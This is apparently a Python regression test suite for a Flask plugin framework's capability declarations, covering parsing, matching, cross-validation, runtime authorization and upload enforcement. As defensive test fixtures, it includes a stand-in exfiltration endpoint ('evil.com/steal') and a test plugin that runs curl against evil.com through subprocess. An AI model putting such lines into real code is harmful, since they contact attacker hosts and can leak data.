# -*- coding: utf-8 -*-
# 框架回归测试套件（FlaskToolkit/tests/），项目根路径自动推导，不依赖绝对路径
import os as _os
import sys as _sys
_TESTS_DIR = _os.path.dirname(_os.path.abspath(__file__))
_PROJECT_ROOT = _os.path.dirname(_TESTS_DIR)
_sys.path.insert(0, _PROJECT_ROOT)
"""插件能力声明（capabilities）回归（v4.3.2，安全强化 P1 阶段二）

覆盖：
A. 解析器单元：合法/非法语法 / 未知域 / 裸 * 拒绝 / 各域能力项
B. 匹配语义：路径前缀与递归 / 绝对路径与大小写 / URL host/path/端口 / 子域通配 / tcp / env
C. 交叉校验：自属路径隐式豁免 / 跨插件越界 missing / 网络端点比对 / subprocess·server·sqlite /
   建议声明生成 / 声明未使用 / ok 判定
D. 运行时授权 API：check_filesystem（豁免+声明+拒绝）/ check_network / check_process 细粒度 /
   fail-closed
E. 安装链路集成（隔离目录 + test client）：enforce 缺声明拒绝附报告 / 补齐声明放行 /
   隐式豁免字面量免声明 / report 附 capabilities 摘要 / 高风险仍拒 / loader 注册能力集 /
   未落盘与真实项目未污染
F. base_plugin data API（v4.3.2）：data_dir 自动创建 / get_data_path / hello_plugin
   示例数据接口端到端

运行：python tests/test_capabilities.py
"""
import io
import json
import os
import shutil
import sys
import tempfile
import zipfile

REAL_BASE = _PROJECT_ROOT
sys.path.insert(0, REAL_BASE)

import global_var
from core import capabilities as C

results = []

def check(name, cond, detail=''):
    results.append((name, cond, detail))
    print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")

# ============ A：解析器单元 ============
r = C.parse_capabilities([
    'filesystem:read:data/', 'filesystem:write:plugins/data/x',
    'network:http:https://erp.corp.local/*', 'network:tcp:smtp.corp:25',
    'network:udp:discovery', 'network:server:0.0.0.0:8080',
    'webhook:wecom:https://qyapi.weixin.qq.com/cgi-bin/*',
    'process:exec', 'process:exec:ffmpeg', 'scheduler',
    'database:sqlite:data/cache.db', 'database:mysql:10.0.0.5:3306/hr',
    'device:serial:COM3', 'device:print', 'env:read:LDAP_*',
])
check("A1 15 项合法声明全部解析", len(r['valid']) == 15 and not r['errors'] and not r['unknown'],
      f"valid={len(r['valid'])} errors={len(r['errors'])} unknown={len(r['unknown'])}")

r = C.parse_capabilities([
    'filesystem:read',            # 缺路径参数
    'network:http:*',             # 裸 * host
    'network:ftp:x',              # 非法子域
    'webhook:slack:https://a.com/',  # 非法平台
    '',                           # 空串
    'process:run',                # 非法子域
])
check("A2 六项非法语法全部进 errors", len(r['errors']) == 6 and not r['valid'],
      f"errors={[e['reason'][:20] for e in r['errors']]}")

r = C.parse_capabilities(['bogus:thing:x', 'future:capability'])
check("A3 未知域进 unknown（告警不拒绝）", len(r['unknown']) == 2 and not r['valid'] and not r['errors'])

r = C.parse_capabilities(None)
check("A4 无声明（None/空）返回空集", not r['valid'] and not r['errors'])

r = C.parse_capabilities('filesystem:read:x')  # 非列表
check("A5 非列表类型容错", len(r['errors']) == 1)

r = C.parse_capabilities(['network:http:https://erp.corp.local/*'])
check("A6 process:exec 三段语法 param=bin",
      C.parse_capabilities(['process:exec:ffmpeg'])['valid'][0]['param'] == 'ffmpeg')

# ============ B：匹配语义 ============
check("B1 目录前缀递归（data 覆盖任意深度）", C.match_path_decl('data', 'data/a/b/c.txt'))
check("B2 尾 * / 尾斜杠 / 裸目录三写法等价",
      C.match_path_decl('data/*', 'data/x.json') and C.match_path_decl('data/', 'data/x.json'))
check("B3 未授权路径不匹配", not C.match_path_decl('data', 'database/x'))
check("B4 绝对路径 + Windows 大小写/分隔符",
      C.match_path_decl('D:/Shared', 'd:\\shared\\2026\\q1.xlsx'))
check("B5 URL host+path 前缀", C.match_url_decl('https://erp.corp.local/*', 'https://erp.corp.local/api/v1/user'))
check("B6 子域通配不匹配裸域", C.match_url_decl('https://*.corp.local/*', 'https://erp.corp.local/x')
      and not C.match_url_decl('https://*.corp.local/*', 'https://corp.local/x'))
check("B7 端口精确折算（声明 8443 vs 默认 443）",
      C.match_url_decl('https://erp.corp.local:8443/*', 'https://erp.corp.local:8443/x')
      and not C.match_url_decl('https://erp.corp.local:8443/*', 'https://erp.corp.local/x'))
check("B8 scheme 区分 http/https", not C.match_url_decl('https://a.com/', 'http://a.com/'))
check("B9 tcp 声明带端口精确 / 无端口任意",
      C.match_tcp_decl('smtp.corp:25', 'tcp://smtp.corp:25')
      and C.match_tcp_decl('smtp.corp', 'tcp://smtp.corp:2525'))
check("B10 env 前缀与通配",
      C.match_env_decl('LDAP_', 'LDAP_HOST') and C.match_env_decl('APP_*', 'APP_SECRET'))

# ============ C：交叉校验 ============
SCAN = {
    'findings': [
        {'severity': 'high', 'category': 'import', 'message': '导入高风险模块 subprocess', 'file': 'x.py', 'line': 1},
        {'severity': 'high', 'category': 'network-server', 'message': '绑定网络端口（开放服务）', 'file': 'x.py', 'line': 2},
        {'severity': 'medium', 'category': 'import', 'message': '导入网络/动态加载模块 sqlite3', 'file': 'x.py', 'line': 3},
    ],
    'summary': {'high': 2, 'medium': 1, 'low': 0, 'info': 0},
    'scope': {
        'paths_read': ['plugins/configs/hr.json', 'D:/shared/reports/r.xlsx'],
        'paths_written': ['plugins/data/hr/out.json', 'plugins/data/other/x.json'],
        'network_endpoints': ['https://erp.corp.local/api/v1', 'https://evil.com/steal', 'tcp://smtp.corp:25'],
    },
}
CAPS = ['filesystem:read:D:/shared', 'network:http:https://erp.corp.local/*',
        'network:tcp:smtp.corp:25', 'process:exec']
res = C.cross_validate('hr', SCAN, CAPS)
check("C1 配置文件读隐式豁免", 'read:plugins/configs/hr.json' in res['implicit_granted'])
check("C2 自属 data 写隐式豁免", 'write:plugins/data/hr/out.json' in res['implicit_granted'])
check("C3 跨插件 data 写仍 missing", 'filesystem:write:plugins/data/other/x.json' in res['missing'])
check("C4 已声明路径/端点不 missing",
      not any('D:/shared' in m or 'erp.corp' in m for m in res['missing']))
check("C5 未声明网络端点 missing", 'network:http:https://evil.com/steal' in res['missing'])
check("C6 server / sqlite 未声明 missing",
      'network:server:<host:port>' in res['missing'] and 'database:sqlite:<目标>' in res['missing'])
check("C7 subprocess 已声明不 missing", 'process:exec' not in res['missing'])
check("C8 建议声明生成（目录/主机归一去重）",
      'filesystem:write:plugins/data/other/' in res['suggested']
      and 'network:http:https://evil.com/' in res['suggested'])
check("C9 ok=False（enforce 拒绝依据）", res['ok'] is False)

res2 = C.cross_validate('hr', SCAN, CAPS + [
    'filesystem:write:plugins/data/other/', 'network:server:0.0.0.0:8080',
    'database:sqlite:data/cache.db', 'network:http:https://evil.com/'])
check("C10 补齐全部声明后 ok=True", res2['ok'] is True)
check("C11 无声明全量 missing（fail-closed）",
      C.cross_validate('hr', SCAN, None)['ok'] is False
      and len(C.cross_validate('hr', SCAN, None)['missing']) >= 5)
check("C12 声明未使用仅提示不阻断",
      'network:udp:discovery' in C.cross_validate('hr', SCAN, CAPS + ['network:udp:discovery'])['unused'])

# ============ D：运行时授权 API ============
C.register_capabilities('hr', CAPS)
check("D1 check_filesystem 声明命中", C.check_filesystem('hr', 'D:/shared/reports/r.xlsx', 'r')[0])
check("D2 check_filesystem 隐式豁免（拼接写法由运行时层兜底）",
      C.check_filesystem('hr', os.path.join(global_var.BASE_DIR, 'plugins', 'data', 'hr', 'a.bin'), 'w')[0])
check("D3 check_filesystem 越界拒绝",
      not C.check_filesystem('hr', 'C:/Windows/system32/config', 'r')[0])
check("D4 check_network 命中/拒绝",
      C.check_network('hr', 'https://erp.corp.local/api/v2')[0]
      and not C.check_network('hr', 'https://evil.com/x')[0])
check("D5 未注册插件 fail-closed", not C.check_network('ghost', 'https://a.com/')[0])
C.register_capabilities('ff', ['process:exec:ffmpeg'])
check("D6 process 细粒度授权",
      C.check_process('ff', 'ffmpeg')[0] and not C.check_process('ff', 'sh')[0])
C.unregister_capabilities('ff')
check("D7 unregister 后 fail-closed", not C.check_process('ff', 'ffmpeg')[0])

# ============ E：安装链路集成（隔离目录） ============
_tmp = tempfile.mkdtemp(prefix='ftk_caps_')

def make_zip(path, files):
    with zipfile.ZipFile(path, 'w') as zf:
        for name, content in files.items():
            zf.writestr(name, content)

_isolated = tempfile.mkdtemp(prefix='ftk_capsapi_')
for sub in ('plugins', 'temp', 'logs'):
    os.makedirs(os.path.join(_isolated, sub))
shutil.copy(os.path.join(REAL_BASE, 'plugins', '__init__.py'),
            os.path.join(_isolated, 'plugins', '__init__.py'))
shutil.copy(os.path.join(REAL_BASE, 'plugins', 'base_plugin.py'),
            os.path.join(_isolated, 'plugins', 'base_plugin.py'))
sys.path.insert(0, _isolated)

_SAVED = {}
for attr, val in (('BASE_DIR', _isolated),
                  ('UPLOAD_TEMP_DIR', os.path.join(_isolated, 'temp')),
                  ('LOG_DIR', os.path.join(_isolated, 'logs')),
                  ('PLUGIN_STATUS_FILE', os.path.join(_isolated, 'plugins', 'status.json'))):
    _SAVED[attr] = getattr(global_var, attr, None)
    setattr(global_var, attr, val)

_saved_scan_mode = global_var.PLUGIN_SCAN_MODE
global_var.PLUGIN_SCAN_MODE = 'enforce'

import app as appmod
from core.plugin_loader import load_plugins
app = appmod.app
app.config["TESTING"] = True
load_plugins()  # 隔离目录无插件 → 游客放行
client = app.test_client()

def upload(zip_path, fname):
    with io.open(zip_path, 'rb') as f:
        data = {'file': (f, fname, 'application/zip')}
        return client.post('/api/admin/plugins/upload', data=data,
                           content_type='multipart/form-data')

def py_plugin(name, body):
    cls = ''.join(w.capitalize() for w in name.split('_'))
    return ('import json\nfrom plugins.base_plugin import BasePlugin\n'
            f'class {cls}Plugin(BasePlugin):\n'
            f'    name = "{name}"\n'
            '    title = "t"\n'
            '    description = "d"\n'
            '    version = "1.0.0"\n'
            '    author = "t"\n'
            '    category = "测试"\n'
            '    @property\n'
            '    def routes(self):\n        return []\n' + body)

# E1：写共享目录字面量 + 无声明 → enforce 拒绝（capabilities missing）
capdemo_zip = os.path.join(_tmp, 'capdemo.zip')
make_zip(capdemo_zip, {
    'plugin.json': json.dumps({'name': 'capdemo', 'version': '1.0.0'}),
    'capdemo.py': py_plugin('capdemo',
        '    def run(self):\n'
        '        with open("D:/shared/out.txt", "w") as f:\n'
        '            f.write("x")\n'),
})
r = upload(capdemo_zip, 'capdemo.zip')
body = r.get_json() or {}
check("E1 enforce 缺声明拒绝 400", r.status_code == 400, f"status={r.status_code} msg={body.get('message', '')[:80]}")
cap_block = (r.get_json() or {}).get('scan_report', {}).get('capabilities', {})
check("E2 拒绝报告附 capabilities 缺失清单与建议声明",
      'filesystem:write:D:/shared/out.txt' in cap_block.get('missing', [])
      and 'filesystem:write:D:/shared/' in cap_block.get('suggested', []),
      f"missing={cap_block.get('missing')} suggested={cap_block.get('suggested')}")
check("E3 缺声明插件未落盘", not os.path.isfile(os.path.join(_isolated, 'plugins', 'capdemo.py')))

# E4：补齐声明 → enforce 放行
make_zip(capdemo_zip, {
    'plugin.json': json.dumps({'name': 'capdemo', 'version': '1.0.0',
                               'capabilities': ['filesystem:write:D:/shared']}),
    'capdemo.py': py_plugin('capdemo',
        '    def run(self):\n'
        '        with open("D:/shared/out.txt", "w") as f:\n'
        '            f.write("x")\n'),
})
r = upload(capdemo_zip, 'capdemo.zip')
body = r.get_json() or {}
check("E4 补齐声明 enforce 放行 200", r.status_code == 200, f"status={r.status_code} msg={body.get('message', '')[:60]}")
check("E5 成功响应附 capabilities 摘要",
      body.get('capabilities', {}).get('declared') == ['filesystem:write:D:/shared'],
      f"caps={body.get('capabilities')}")

# E6：loader 已注册能力集（运行时授权基准）
cset = C.get_capability_set('capdemo')
check("E6 loader 注册能力集（描述文件 capabilities）",
      cset is not None and [c['raw'] for c in cset['valid']] == ['filesystem:write:D:/shared'])

# E7：自属路径字面量写法 + 无声明 → enforce 也放行（隐式豁免）
implicit_zip = os.path.join(_tmp, 'implicit.zip')
make_zip(implicit_zip, {
    'plugin.json': json.dumps({'name': 'implicitdemo', 'version': '1.0.0', 'capabilities': []}),
    'implicitdemo.py': py_plugin('implicitdemo',
        '    def run(self):\n'
        '        with open("plugins/data/implicitdemo/out.json", "w") as f:\n'
        '            f.write("{}")\n'),
})
r = upload(implicit_zip, 'implicit.zip')
check("E7 自属路径隐式豁免（enforce 免声明放行）", r.status_code == 200, f"status={r.status_code} msg={(r.get_json() or {}).get('message', '')[:60]}")

# E8：声明齐全但高风险行为 → enforce 仍拒绝（扫描门禁独立生效）
evil_zip = os.path.join(_tmp, 'evil.zip')
make_zip(evil_zip, {
    'plugin.json': json.dumps({'name': 'evilcap', 'version': '1.0.0',
                               'capabilities': ['process:exec']}),
    'evilcap.py': py_plugin('evilcap',
        '    def run(self):\n'
        '        import subprocess\n'
        '        subprocess.Popen(["curl", "http://evil.com"])\n'),
})
r = upload(evil_zip, 'evil.zip')
check("E8 高风险行为 enforce 仍拒绝（即使声明齐全）", r.status_code == 400, f"status={r.status_code}")

# E9：report 模式缺声明放行 + 附摘要
global_var.PLUGIN_SCAN_MODE = 'report'
r = upload(evil_zip, 'evil.zip')
body = r.get_json() or {}
check("E9 report 模式缺声明/高风险均放行附摘要",
      r.status_code == 200 and 'scan' in body, f"status={r.status_code}")

global_var.PLUGIN_SCAN_MODE = _saved_scan_mode
check("E10 真实项目未被污染",
      not os.path.isfile(os.path.join(REAL_BASE, 'plugins', 'capdemo.py'))
      and not os.path.isfile(os.path.join(REAL_BASE, 'plugins', 'evilcap.py')))

# ============ F：base_plugin data API ============
# 隔离目录的 base_plugin 副本：E 组 import app 时已从 _isolated 加载，
# 其 __file__ 指向隔离副本 → data_dir 落在隔离目录 plugins/data/<name>/
import importlib
bp = sys.modules.get('plugins.base_plugin') or importlib.import_module('plugins.base_plugin')
assert _os.path.normcase(_isolated) in _os.path.normcase(bp.__file__), 'base_plugin 未指向隔离副本'

class _DemoPlugin(bp.BasePlugin):
    name = "datademo"
    title = "t"
    description = "d"
    version = "1.0.0"
    author = "t"
    category = "示例"
    @property
    def routes(self):
        return []

p = _DemoPlugin()
d = p.data_dir
check("F1 data_dir 指向 plugins/data/<name> 并自动创建",
      _os.path.normcase(d).endswith(_os.path.normcase(os.path.join('plugins', 'data', 'datademo')))
      and os.path.isdir(d), f"data_dir={d}")
fp = p.get_data_path('sub', 'x.json')
check("F2 get_data_path 拼接并创建父目录", os.path.isdir(os.path.dirname(fp)) and fp.endswith('x.json'))

# F3：hello_plugin 示例数据接口端到端（隔离安装）
hello_zip = os.path.join(_tmp, 'hello.zip')
hello_dir = os.path.join(REAL_BASE, 'examples', 'plugins', 'hello_plugin')
with zipfile.ZipFile(hello_zip, 'w') as zf:
    zf.write(os.path.join(hello_dir, 'hello_plugin.py'), 'hello_plugin.py')
    zf.write(os.path.join(hello_dir, 'plugin.json'), 'plugin.json')
r = upload(hello_zip, 'hello.zip')
check("F3 hello_plugin 示例安装成功（空声明）", r.status_code == 200,
      f"status={r.status_code} msg={(r.get_json() or {}).get('message', '')[:60]}")
r = client.get('/api/hello_plugin/data-demo')
body = r.get_json() or {}
check("F4 示例数据接口返回 visits 计数", r.status_code == 200 and body.get('data', {}).get('visits') == 1,
      f"status={r.status_code} body={str(body)[:100]}")
_data_file = body.get('data', {}).get('data_file', '')
check("F5 数据落在隔离目录自属路径",
      _os.path.normcase(_isolated) in _os.path.normcase(_data_file)
      and _os.path.normcase(os.path.join('plugins', 'data', 'hello_plugin')) in _os.path.normcase(_data_file),
      f"data_file={_data_file}")
check("F6 真实项目 hello_plugin 数据未污染",
      not os.path.isfile(os.path.join(REAL_BASE, 'plugins', 'data', 'hello_plugin', 'visits.json')))

# ============ 汇总 ============
n_pass = sum(1 for _, c, _ in results if c)
n_fail = len(results) - n_pass
print(f"\n==== 插件能力声明回归（v4.3.2）：共 {len(results)} 项，通过 {n_pass}，失败 {n_fail} ====")
sys.exit(1 if n_fail else 0)
